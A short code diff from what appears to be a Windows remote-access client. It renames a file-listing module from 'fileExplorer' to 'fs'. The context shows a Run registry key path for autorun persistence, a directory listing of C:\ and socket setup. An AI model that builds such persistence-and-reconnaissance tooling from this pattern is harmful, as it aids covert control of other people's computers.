@@ -17,7 +17,7 @@
 
 #include "net.h"
 #include "osinfo.h"
-#include "fileExplorer.h"
+#include "fs.h"
 
 #define HKEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
@@ -48,9 +48,9 @@ int main() {
       "",
       ID);
 
-  struct fileExplorer::s_folder folder;
-  fileExplorer::getContent(&folder, (char *)"C:\\");
-  fileExplorer::print(&folder);
+  struct fs::s_folder folder;
+  fs::ls(&folder, (char *)"C:\\");
+  fs::print(&folder);
 
   SOCKET sock;
   net::createSocket(&sock);
